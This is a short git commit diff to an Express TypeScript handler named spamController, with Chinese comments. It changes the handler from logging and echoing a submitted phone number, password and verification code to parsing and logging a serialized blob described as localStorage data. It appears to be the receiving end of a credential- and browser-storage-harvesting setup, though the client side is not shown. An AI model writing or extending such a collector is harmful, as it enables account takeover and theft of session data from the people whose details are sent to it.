b93ed16d2b5b22a398147db2c07e85c0cc675c17
lwl <1903445178@qq.com>
2024-12-19 15:42:26 +0800

    get serialized data

--- src/controllers/spamController.ts
+++ src/controllers/spamController.ts
@@ -1,13 +1,12 @@
 import { Request, Response } from 'express';
 
 export const handleSpamRequest = async (req: Request, res: Response) => {
-  const { phoneNumber, password, code } = req.body;
+  const { data } = req.body;
 
-  // 这里可以添加处理逻辑，例如验证数据、存储到数据库等
-  console.log('接收到的数据:', { phoneNumber, password, code });
+  // 解析接收到的序列化数据
+  const parsedData = JSON.parse(data);
+  console.log('接收到的 localStorage 数据:', parsedData);
 
   // 返回成功响应
-  res
-    .status(200)
-    .json({ message: '请求成功', data: { phoneNumber, password, code } });
+  res.status(200).json({ message: '请求成功', data: parsedData });
 };
